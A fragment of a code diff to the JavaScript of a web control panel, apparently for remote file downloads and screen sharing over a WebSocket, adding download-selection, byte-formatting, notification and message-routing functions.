+        }
+        const downloadBtn = document.querySelector('.download-selected button');
+        if (downloadBtn) {
+            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
+        }
+    }
+
+    function downloadSelected() {
+        if (selectedFiles.length === 0) {
+            alert('No files selected');
+            return;
+        }
+        selectedFiles.forEach(path => {
+            sendPlainText('dl ' + path);
+        });
+    }
+
+    function formatBytes(b) {
+        if (b === 0) return '0 B';
+        const k = 1024, sizes = ['B','KB','MB','GB'];
+        const i = Math.floor(Math.log(b)/Math.log(k));
+        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
+    }
+
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
+    }
+
+    // ---------- WEBSOCKET MESSAGE HANDLER ----------
+    function handleIncomingMessage(msg) {
+        try {
+            const json = JSON.parse(msg);
+            if (json.type === 'SIGNALING') {
+                handleSignalingMessage(json.data);
+            } else {
+                // Assume it's a command response or other JSON
+                handleJSON(json);
+            }
+        } catch (e) {
+            // Not JSON – treat as plain text
+            handlePlainText(msg);
+        }
+    }
 
     // ---------- WEBSOCKET CONNECTION ----------
     function connectWebSocket() {
-        if (ws) ws.close();
+        if (ws) {
+            ws.close();
+        }
         setStatus('CONNECTING');
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
@@ -578,6 +1281,7 @@
             handleIncomingMessage(e.data);
         };
         ws.onclose = () => {
+            console.log('WebSocket closed');
             setStatus('OFFLINE');
             panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
             ws = null;
@@ -611,10 +1315,9 @@
     window.snapScreen = snapScreen;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
+
+    // ---------- START ----------
     connectWebSocket();
 </script>
 </body>
 </html>
-
-
-
